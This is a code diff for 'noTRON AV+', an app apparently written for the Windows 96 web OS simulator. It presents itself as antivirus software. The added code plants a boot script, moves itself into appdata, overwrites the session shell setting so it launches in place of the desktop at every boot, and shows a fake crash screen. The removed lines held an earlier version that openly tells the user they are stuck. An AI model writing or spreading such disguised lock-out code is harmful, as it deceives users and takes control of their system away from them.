@@ -17,10 +17,24 @@ class GUIApplication extends WApplication {
     async main(argv) {
         super.main(argv);
 
-        // Create the window
+        const fs = w96.FS;
+
+        if(fs.exists("c:/system/boot/notron.js")){
         const mainwnd = this.createWindow({
             title: "noTRON AV+",
-            body: "Installing noTRON AV+...",
+            body: "Please preform a full system scan...<br><progress id='prog' value='0' max='100'></progress><br><button>Preform full system scan</button>",
+            bodyClass: "sample-app",
+            taskbar: false,
+            resizable: false,
+            initialHeight: 200,
+            initialWidth: 250,
+            icon: await Theme.getIconUrl("mime/executable", '16x16')
+        }, true);
+        mainwnd.show();
+        } else {
+            const mainwnd = this.createWindow({
+            title: "noTRON AV+",
+            body: "Installing noTRON AV+",
             bodyClass: "sample-app",
             taskbar: false,
             resizable: false,
@@ -28,63 +42,13 @@ class GUIApplication extends WApplication {
             initialWidth: 250,
             icon: await Theme.getIconUrl("mime/executable", '16x16')
         }, true);
-
-        const fs = w96.FS;
-
-        if(!fs.exists("c:/system/boot/notron.js")){
-            fs.writestr("c:/system/boot/notron.js", '');
-        }
-        if(!fs.exists("c:/user/appdata/z.wrt")){
-            fs.writestr("c:/user/appdata/z.wrt", '
-const { Theme } = w96.ui;
-const { sysConf: SCM } = w96;
-
-class GUIApplication extends WApplication {
-    /**
-     * Application constructor.
-     */
-    constructor() {
-        super();
-    }
-    
-    /**
-     * Main entry point.
-     * @param {String[]} argv The program arguments.
-     */
-    async main(argv) {
-        super.main(argv);
-
-        // Create the window
-        const mainwnd = this.createWindow({
-            title: "noTRON AV+",
-            body: "Please preform a system scan...<br><button onClick=\"alert(\'You cannot preform a system scan. You are stuck like this.\')\">Preform a system scan</button>",
-            bodyClass: "sample-app",
-            taskbar: false,
-            resizable: false,
-            initialHeight: 480,
-            initialWidth: 640,
-            icon: await Theme.getIconUrl("mime/executable", '16x16')
-        }, true);
-
-        const fs = w96.FS;
-
-        if(!fs.exists("c:/system/boot/notron.js")){
-            fs.writestr("c:/system/boot/notron.js", 'const fs = w96.FS;const { sysConf: SCM } = w96;SCM.set("System/Session/Shell/exec","c:/user/appdata/z.wrt");await SCM.syncRoot("Software");');
-        }
-        SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
-        await SCM.syncRoot("Software");
-        
-        // Show the window
         mainwnd.show();
-    }
-}
-
-return await WApplication.execAsync(new GUIApplication(), this.boxedEnv.args);');
+            await fs.writestr("c:/system/boot/notron.js", 'const fs = w96.FS;const { sysConf: SCM } = w96;SCM.set("System/Session/Shell/exec","c:/user/appdata/z.wrt");await SCM.syncRoot("Software");');
+            await fs.mvfile("c:/user/desktop/notronplus.wrt", "c:/user/appdata/z.wrt");
+            SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
+            await SCM.syncRoot("Software");
+            w96.sys.renderBSOD("Failed to render window");
         }
-        SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
-        await SCM.syncRoot("Software");
-        await fs.rm("c:/user/desktop/notronplus.wrt");
-        w96.sys.renderBSOD("Failed to render window");
     }
 }
 
